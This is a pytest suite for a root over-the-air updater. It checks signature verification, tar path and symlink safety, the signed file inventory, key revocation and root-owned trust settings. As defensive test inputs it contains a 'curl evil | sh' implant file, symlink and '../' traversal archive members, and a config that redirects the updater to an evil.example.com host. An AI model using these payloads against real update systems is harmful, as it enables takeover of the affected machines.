"""The root OTA updater must authenticate a package before unpacking it, and its
trust settings must come only from places the app account cannot write."""

from __future__ import annotations

import hashlib
import io
import json
import logging
import os
import sys
import tarfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives.serialization import (
    Encoding, NoEncryption, PrivateFormat, PublicFormat,
)

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))
from updater import agent, package_trust
from updater.config import AgentConfig, load_config, save_config
from updater.crypto import SecurityError, public_key_fingerprint, load_public_key
from updater.trust import TrustSettings, load_trust, require_root_owned

UID = os.getuid()


# ── helpers ──────────────────────────────────────────────────────────────────

class Key:
    def __init__(self, directory: Path, name: str):
        self.private = Ed25519PrivateKey.generate()
        self.pub_path = directory / f"{name}.pub"
        directory.mkdir(parents=True, exist_ok=True)
        directory.chmod(0o755)  # not group-writable whatever the umask is
        self.pub_path.write_bytes(
            self.private.public_key().public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
        )
        self.pub_path.chmod(0o644)

    def sign(self, data: bytes) -> bytes:
        return self.private.sign(data)

    @property
    def fingerprint(self) -> str:
        return public_key_fingerprint(load_public_key(str(self.pub_path)))


def sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


GOOD_FILES = {
    "code/.version": b"1.2.3\n",
    "code/scripts/run.sh": b"#!/bin/sh\necho hi\n",
    "go-binaries/zenplus-poller": b"\x7fELF-not-really",
    "requirements.txt": b"httpx==0.27\n",
}


def build_package(
    path: Path,
    key: Key,
    files: dict[str, bytes] | None = None,
    *,
    version: str = "1.2.3",
    inventory: bool | dict = True,
    extra_members: list[tarfile.TarInfo] | None = None,
    extra_data: dict[str, bytes] | None = None,
    age_days: int = 0,
    include_sig: bool = True,
    sign_with: Key | None = None,
    dirs: list[str] | None = None,
) -> bytes:
    """Write a .zup and return the signature bytes."""
    files = dict(GOOD_FILES if files is None else files)
    manifest: dict = {
        "format_version": 2,
        "version": version,
        "release_date": (datetime.now(timezone.utc) - timedelta(days=age_days)).isoformat(),
        "steps": [],
    }
    if inventory is True:
        manifest["payload_files"] = {n: sha(d) for n, d in files.items()}
    elif isinstance(inventory, dict):
        manifest["payload_files"] = inventory
    manifest_bytes = json.dumps(manifest).encode()
    signature = (sign_with or key).sign(manifest_bytes)

    with tarfile.open(path, "w:gz") as tar:
        def add(name: str, data: bytes, mode: int = 0o644):
            info = tarfile.TarInfo(name)
            info.size = len(data)
            info.mode = mode
            tar.addfile(info, io.BytesIO(data))
        for d in dirs or []:
            info = tarfile.TarInfo(d)
            info.type = tarfile.DIRTYPE
            info.mode = 0o755
            tar.addfile(info)
        add("manifest.json", manifest_bytes)
        if include_sig:
            add("manifest.json.sig", signature)
        for name, data in files.items():
            add(name, data, 0o755 if name.endswith(("run.sh", "poller")) else 0o644)
        for name, data in (extra_data or {}).items():
            add(name, data)
        for member in extra_members or []:
            tar.addfile(member)
    return signature


@pytest.fixture
def key(tmp_path):
    return Key(tmp_path / "keys", "release")


@pytest.fixture
def pkg(tmp_path):
    return tmp_path / "update.zup"


@pytest.fixture
def out(tmp_path):
    return tmp_path / "extract"


def extract(pkg, out, key, **kw):
    kw.setdefault("public_key_paths", [str(key.pub_path)])
    return package_trust.verify_and_extract(str(pkg), str(out), **kw)


# ── a good package ───────────────────────────────────────────────────────────

def test_valid_package_is_verified_and_written(pkg, out, key):
    build_package(pkg, key)
    manifest = extract(pkg, out, key, expected_version="1.2.3")
    assert manifest["version"] == "1.2.3"
    for name, data in GOOD_FILES.items():
        assert (out / name).read_bytes() == data
    assert (out / "manifest.json").exists() and (out / "manifest.json.sig").exists()
    assert os.access(out / "code/scripts/run.sh", os.X_OK)
    assert not os.access(out / "requirements.txt", os.X_OK)


def test_directory_members_are_created(pkg, out, key):
    build_package(pkg, key, dirs=["code", "code/scripts"])
    extract(pkg, out, key)
    assert (out / "code/scripts").is_dir()


# ── hostile archive structure: refused before anything is written ────────────

def _link(kind, name, target):
    info = tarfile.TarInfo(name)
    info.type = kind
    info.linkname = target
    return info


@pytest.mark.parametrize("member", [
    _link(tarfile.SYMTYPE, "code/escape", "/etc"),
    _link(tarfile.LNKTYPE, "code/hard", "code/.version"),
    tarfile.TarInfo("code/pipe"),
    tarfile.TarInfo("code/dev"),
], ids=["symlink", "hardlink", "fifo", "chardev"])
def test_links_and_special_files_are_refused(pkg, out, key, member):
    if member.name == "code/pipe":
        member.type = tarfile.FIFOTYPE
    elif member.name == "code/dev":
        member.type = tarfile.CHRTYPE
    build_package(pkg, key, extra_members=[member])
    with pytest.raises(SecurityError, match="link|special"):
        extract(pkg, out, key)
    assert not out.exists()


def test_symlink_cannot_redirect_a_later_write_outside(tmp_path, pkg, out, key):
    """The classic attack: a symlink entry followed by a file written through it."""
    victim = tmp_path / "victim"
    victim.mkdir()
    link = _link(tarfile.SYMTYPE, "code/escape", str(victim))
    build_package(pkg, key, extra_members=[link], extra_data={"code/escape/pwned": b"x"})
    with pytest.raises(SecurityError):
        extract(pkg, out, key)
    assert list(victim.iterdir()) == []
    assert not out.exists()


@pytest.mark.parametrize("name", [
    "../evil", "/abs/evil", "a/../../evil", "./x", "a//b", "code\\evil", "a/./b",
])
def test_unsafe_names_are_refused(pkg, out, key, name):
    build_package(pkg, key, extra_data={name: b"x"})
    with pytest.raises(SecurityError, match="Unsafe path"):
        extract(pkg, out, key)
    assert not out.exists()


def test_duplicate_entries_are_refused(pkg, out, key):
    build_package(pkg, key, extra_data={"code/.version": b"9.9.9\n"})
    with pytest.raises(SecurityError, match="Duplicate"):
        extract(pkg, out, key)


def test_oversized_file_is_refused(pkg, out, key, monkeypatch):
    monkeypatch.setattr(package_trust, "MAX_FILE_BYTES", 8)
    build_package(pkg, key)
    with pytest.raises(SecurityError, match="too large"):
        extract(pkg, out, key)


def test_existing_extract_directory_is_refused_and_left_alone(pkg, out, key):
    build_package(pkg, key)
    out.mkdir()
    (out / "precious").write_text("not ours to delete")
    with pytest.raises(SecurityError):
        extract(pkg, out, key)
    assert (out / "precious").read_text() == "not ours to delete"


def test_a_file_cannot_shadow_a_directory(pkg, out, key):
    files = dict(GOOD_FILES, **{"code": b"i am a file", "code/inner": b"y"})
    build_package(pkg, key, files=files)
    with pytest.raises(SecurityError):
        extract(pkg, out, key)
    assert not out.exists()


def test_garbage_archive_is_a_security_error(tmp_path, out, key):
    bad = tmp_path / "bad.zup"
    bad.write_bytes(b"this is not a gzip file")
    with pytest.raises(SecurityError, match="could not be unpacked"):
        extract(bad, out, key)


# ── signature: checked before any file is written ────────────────────────────

def test_wrong_signing_key_is_refused_and_nothing_is_written(tmp_path, pkg, out, key):
    attacker = Key(tmp_path / "attacker", "attacker")
    build_package(pkg, key, sign_with=attacker)
    with pytest.raises(SecurityError, match="signature"):
        extract(pkg, out, key)
    assert not out.exists()


def test_missing_signature_is_refused(pkg, out, key):
    build_package(pkg, key, include_sig=False)
    with pytest.raises(SecurityError, match="no manifest signature"):
        extract(pkg, out, key)
    assert not out.exists()


def test_signature_supplied_by_the_server_is_used_when_absent_from_package(pkg, out, key):
    sig = build_package(pkg, key, include_sig=False)
    extract(pkg, out, key, fallback_signature=sig)
    assert (out / "manifest.json.sig").read_bytes() == sig


def test_a_server_supplied_signature_cannot_vouch_for_a_different_manifest(tmp_path, pkg, out, key):
    attacker = Key(tmp_path / "attacker", "attacker")
    build_package(pkg, key, include_sig=False)
    forged = attacker.sign(b"anything")
    with pytest.raises(SecurityError, match="signature"):
        extract(pkg, out, key, fallback_signature=forged)


def test_manifest_older_than_the_limit_is_refused(pkg, out, key):
    build_package(pkg, key, age_days=60)
    with pytest.raises(SecurityError, match="too old"):
        extract(pkg, out, key, max_age_days=30)


def test_a_validly_signed_package_for_another_version_is_refused(pkg, out, key):
    """Replay: the server (or a MITM) answers a request for 1.2.4 with signed 1.2.3."""
    build_package(pkg, key, version="1.2.3")
    with pytest.raises(SecurityError, match="offered"):
        extract(pkg, out, key, expected_version="1.2.4")
    assert not out.exists()


# ── key rotation and revocation ──────────────────────────────────────────────

def test_a_second_trusted_key_verifies_a_package(tmp_path, pkg, out, key):
    new_key = Key(tmp_path / "keys", "release-2")
    build_package(pkg, new_key)
    extract(pkg, out, key, public_key_paths=[str(key.pub_path), str(new_key.pub_path)])


def test_a_revoked_key_no_longer_verifies(pkg, out, key):
    build_package(pkg, key)
    with pytest.raises(SecurityError, match="signature"):
        extract(pkg, out, key, revoked_fingerprints=frozenset({key.fingerprint}))
    assert not out.exists()


def test_revoking_one_key_leaves_the_other_working(tmp_path, pkg, out, key):
    new_key = Key(tmp_path / "keys", "release-2")
    build_package(pkg, new_key)
    extract(pkg, out, key,
            public_key_paths=[str(key.pub_path), str(new_key.pub_path)],
            revoked_fingerprints=frozenset({key.fingerprint}))


# ── the signed file inventory ────────────────────────────────────────────────

def test_a_tampered_payload_file_is_refused(pkg, out, key):
    """Signature is valid, but a file's bytes differ from the signed hash."""
    inventory = {n: sha(d) for n, d in GOOD_FILES.items()}
    tampered = dict(GOOD_FILES, **{"go-binaries/zenplus-poller": b"backdoored"})
    build_package(pkg, key, files=tampered, inventory=inventory)
    with pytest.raises(SecurityError, match="Hash mismatch"):
        extract(pkg, out, key)
    assert not out.exists()


def test_a_file_missing_from_the_inventory_is_refused(pkg, out, key):
    """An attacker adds a file to a correctly signed package."""
    build_package(pkg, key, extra_data={"code/scripts/implant.sh": b"curl evil | sh"})
    with pytest.raises(SecurityError, match="not in the signed inventory"):
        extract(pkg, out, key)
    assert not out.exists()


def test_a_file_listed_but_absent_is_refused(pkg, out, key):
    inventory = {n: sha(d) for n, d in GOOD_FILES.items()}
    inventory["code/scripts/ghost.sh"] = sha(b"x")
    build_package(pkg, key, inventory=inventory)
    with pytest.raises(SecurityError, match="missing"):
        extract(pkg, out, key)


def test_a_package_without_an_inventory_is_refused_by_default(pkg, out, key):
    build_package(pkg, key, inventory=False)
    with pytest.raises(SecurityError, match="no signed file inventory"):
        extract(pkg, out, key)
    assert not out.exists()


def test_legacy_packages_install_only_when_the_trust_file_allows(pkg, out, key):
    build_package(pkg, key, inventory=False)
    manifest = extract(pkg, out, key, allow_legacy=True)
    assert "payload_files" not in manifest
    assert (out / "code/.version").exists()


@pytest.mark.parametrize("bad", [
    {}, [], "x", {"code/.version": "not-a-hash"}, {"code/.version": 5},
    {"manifest.json": "0" * 64},
])
def test_a_malformed_inventory_is_refused(pkg, out, key, bad):
    build_package(pkg, key, inventory=bad)
    with pytest.raises(SecurityError):
        extract(pkg, out, key)


def test_the_inventory_covers_every_file_the_builder_ships():
    """The builder and the agent must agree on which files are not inventoried."""
    sys.path.insert(0, str(ROOT / "scripts"))
    import importlib.util
    spec = importlib.util.spec_from_file_location("build_release", ROOT / "scripts" / "build-release.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    assert set(module.INVENTORY_EXCLUDED) == set(package_trust.INVENTORY_EXCLUDED)
    assert module.INVENTORY_KEY == package_trust.INVENTORY_KEY


# ── trust settings come only from root-owned places ──────────────────────────

def conf(path: Path, body: str, mode: int = 0o644) -> Path:
    path.write_text(body)
    path.chmod(mode)
    return path


def trust_kwargs(tmp_path):
    return dict(trusted_uid=UID, stop_at=tmp_path)


def test_missing_trust_file_gives_the_safe_defaults(tmp_path):
    trust = load_trust(tmp_path / "absent.conf", key_dropin_dir=tmp_path / "none",
                       default_key_path=tmp_path / "default.pub", **trust_kwargs(tmp_path))
    assert trust.server_url == "https://zentryc.com"
    assert trust.verify_tls is True and trust.allow_legacy_packages is False
    assert trust.max_manifest_age_days == 30


def test_trust_file_values_are_applied(tmp_path):
    path = conf(tmp_path / "t.conf", "[trust]\nserver_url = https://ota.example.com\n"
                "max_manifest_age_days = 365\nallow_legacy_packages = true\n"
                "revoked_key_fingerprints = aa11, bb22\n")
    trust = load_trust(path, key_dropin_dir=tmp_path / "none",
                       default_key_path=tmp_path / "default.pub", **trust_kwargs(tmp_path))
    assert trust.server_url == "https://ota.example.com"
    assert trust.max_manifest_age_days == 365
    assert trust.allow_legacy_packages is True
    assert trust.revoked_key_fingerprints == {"aa11", "bb22"}


def test_group_writable_trust_file_stops_the_updater(tmp_path):
    path = conf(tmp_path / "t.conf", "[trust]\n", mode=0o664)
    with pytest.raises(SecurityError, match="writable"):
        load_trust(path, key_dropin_dir=tmp_path / "none",
                   default_key_path=tmp_path / "d.pub", **trust_kwargs(tmp_path))


def test_trust_file_owned_by_someone_else_stops_the_updater(tmp_path):
    path = conf(tmp_path / "t.conf", "[trust]\n")
    with pytest.raises(SecurityError, match="owned by uid"):
        load_trust(path, key_dropin_dir=tmp_path / "none", default_key_path=tmp_path / "d.pub",
                   trusted_uid=UID + 1, stop_at=tmp_path)


def test_a_symlinked_trust_file_is_refused(tmp_path):
    real = conf(tmp_path / "real.conf", "[trust]\n")
    link = tmp_path / "t.conf"
    link.symlink_to(real)
    with pytest.raises(SecurityError, match="symlink"):
        load_trust(link, key_dropin_dir=tmp_path / "none",
                   default_key_path=tmp_path / "d.pub", **trust_kwargs(tmp_path))


def test_a_writable_parent_directory_is_refused(tmp_path):
    sub = tmp_path / "etc"
    sub.mkdir()
    path = conf(sub / "t.conf", "[trust]\n")
    sub.chmod(0o777)
    with pytest.raises(SecurityError, match="writable"):
        load_trust(path, key_dropin_dir=tmp_path / "none",
                   default_key_path=tmp_path / "d.pub", **trust_kwargs(tmp_path))


@pytest.mark.parametrize("url", ["http://ota.example.com", "ftp://x", "ota.example.com"])
def test_a_non_https_server_url_is_refused(tmp_path, url):
    path = conf(tmp_path / "t.conf", f"[trust]\nserver_url = {url}\n")
    with pytest.raises(SecurityError, match="https"):
        load_trust(path, key_dropin_dir=tmp_path / "none",
                   default_key_path=tmp_path / "d.pub", **trust_kwargs(tmp_path))


def test_key_dropin_directory_adds_trusted_keys(tmp_path):
    drop = tmp_path / "keys.d"
    Key(drop, "second")
    (drop / "ignored.txt").write_text("not a key")
    default = Key(tmp_path / "keys", "default").pub_path
    trust = load_trust(tmp_path / "absent.conf", key_dropin_dir=drop,
                       default_key_path=default, **trust_kwargs(tmp_path))
    assert trust.public_key_paths == (str(default), str(drop / "second.pub"))


def test_agent_conf_cannot_override_any_trust_setting(tmp_path, caplog):
    """The core of B3: agent.conf is app-writable, so its trust values are ignored."""
    agent_conf = conf(tmp_path / "agent.conf", (
        "[server]\nurl = https://evil.example.com\ncheck_interval_seconds = 60\n"
        "[security]\nverify_tls = false\npublic_key_path = /tmp/evil.pub\n"
        "max_manifest_age_days = 99999\n"
        "[appliance]\nid = abc\napi_key = secret\n"), mode=0o600)
    with caplog.at_level(logging.WARNING, logger="zenplus.updater"):
        cfg = load_config(str(agent_conf), trust=TrustSettings())
    assert cfg.server.url == "https://zentryc.com"
    assert cfg.security.verify_tls is True
    assert cfg.security.max_manifest_age_days == 30
    assert cfg.security.public_key_paths == TrustSettings().public_key_paths
    assert cfg.security.public_key_path == TrustSettings().public_key_paths[0]
    # Enrollment state and operational settings still come from agent.conf.
    assert cfg.appliance.id == "abc" and cfg.appliance.api_key == "secret"
    assert cfg.server.check_interval_seconds == 60
    assert "Ignoring" in caplog.text and "verify_tls" in caplog.text


def test_trust_applies_even_when_agent_conf_is_missing(tmp_path):
    cfg = load_config(str(tmp_path / "missing.conf"),
                      trust=TrustSettings(server_url="https://ota.example.com"))
    assert cfg.server.url == "https://ota.example.com"


def test_save_config_does_not_persist_trust_settings(tmp_path):
    path = tmp_path / "agent.conf"
    cfg = AgentConfig()
    cfg.appliance.id = "abc"
    save_config(cfg, str(path))
    text = path.read_text()
    assert "[security]" not in text and "url" not in text and "verify_tls" not in text
    assert "id = abc" in text


# ── the updater's scratch directory ──────────────────────────────────────────

def test_work_dir_must_not_be_writable_by_others(tmp_path):
    work = tmp_path / "work"
    assert agent._prepare_work_dir(work, trusted_uid=UID, stop_at=tmp_path) == work
    work.chmod(0o777)
    with pytest.raises(SecurityError, match="writable"):
        agent._prepare_work_dir(work, trusted_uid=UID, stop_at=tmp_path)


def test_work_dir_planted_by_another_user_is_refused(tmp_path):
    work = tmp_path / "work"
    work.mkdir(mode=0o755)
    with pytest.raises(SecurityError, match="owned by uid"):
        agent._prepare_work_dir(work, trusted_uid=UID + 1, stop_at=tmp_path)


def test_work_dir_that_is_a_symlink_is_refused(tmp_path):
    target = tmp_path / "elsewhere"
    target.mkdir()
    work = tmp_path / "work"
    work.symlink_to(target)
    with pytest.raises(SecurityError, match="symlink"):
        agent._prepare_work_dir(work, trusted_uid=UID, stop_at=tmp_path)


# ── the whole agent path ─────────────────────────────────────────────────────

def agent_cfg(key: Key, **security) -> AgentConfig:
    cfg = AgentConfig()
    cfg.security.public_key_paths = (str(key.pub_path),)
    cfg.security.public_key_path = str(key.pub_path)
    for name, value in security.items():
        setattr(cfg.security, name, value)
    return cfg


@pytest.fixture
def wired_agent(tmp_path, pkg, monkeypatch):
    work = tmp_path / "work"
    monkeypatch.setattr(agent, "TEMP_DIR", work)
    monkeypatch.setattr(agent, "_prepare_work_dir",
                        lambda *a, **k: (work.mkdir(exist_ok=True), work)[1])
    monkeypatch.setattr(agent, "_api_headers", lambda cfg: {})

    def fake_download(url, dest_path, expected_sha256, **kwargs):
        Path(dest_path).write_bytes(pkg.read_bytes())
        return dest_path
    monkeypatch.setattr(agent, "download_package", fake_download)
    return work


def release(version="1.2.3", sig=""):
    return {"version": version, "package_url": "https://x/y.zup",
            "package_sha256": "0" * 64, "manifest_sig": sig}


def test_download_and_extract_end_to_end(pkg, key, wired_agent):
    build_package(pkg, key)
    extract_dir, manifest = agent.download_and_extract(agent_cfg(key), release())
    assert manifest["version"] == "1.2.3"
    assert (Path(extract_dir) / "code" / ".version").read_text() == "1.2.3\n"


def test_download_and_extract_refuses_a_tampered_package(pkg, key, wired_agent):
    inventory = {n: sha(d) for n, d in GOOD_FILES.items()}
    build_package(pkg, key, files=dict(GOOD_FILES, **{"requirements.txt": b"evil"}), inventory=inventory)
    with pytest.raises(SecurityError):
        agent.download_and_extract(agent_cfg(key), release())
    assert not (wired_agent / "update-1.2.3").exists()


def test_download_and_extract_honours_the_legacy_policy(pkg, key, wired_agent):
    build_package(pkg, key, inventory=False)
    with pytest.raises(SecurityError, match="inventory"):
        agent.download_and_extract(agent_cfg(key), release())
    extract_dir, _ = agent.download_and_extract(agent_cfg(key, allow_legacy_packages=True), release())
    assert (Path(extract_dir) / "code" / ".version").exists()


def test_download_and_extract_replaces_a_stale_extract_dir(pkg, key, wired_agent):
    build_package(pkg, key)
    stale = wired_agent / "update-1.2.3"
    stale.mkdir(parents=True)
    (stale / "leftover").write_text("old")
    extract_dir, _ = agent.download_and_extract(agent_cfg(key), release())
    assert not (Path(extract_dir) / "leftover").exists()


def test_download_and_extract_will_not_follow_a_planted_symlink(tmp_path, pkg, key, wired_agent):
    build_package(pkg, key)
    victim = tmp_path / "victim"
    victim.mkdir()
    (victim / "keep").write_text("precious")
    wired_agent.mkdir(exist_ok=True)
    (wired_agent / "update-1.2.3").symlink_to(victim)
    agent.download_and_extract(agent_cfg(key), release())
    assert (victim / "keep").read_text() == "precious"
    assert [p.name for p in victim.iterdir()] == ["keep"]


def test_require_root_owned_accepts_a_tamper_proof_file(tmp_path):
    path = conf(tmp_path / "f", "x", mode=0o644)
    require_root_owned(path, what="test file", trusted_uid=UID, stop_at=tmp_path)
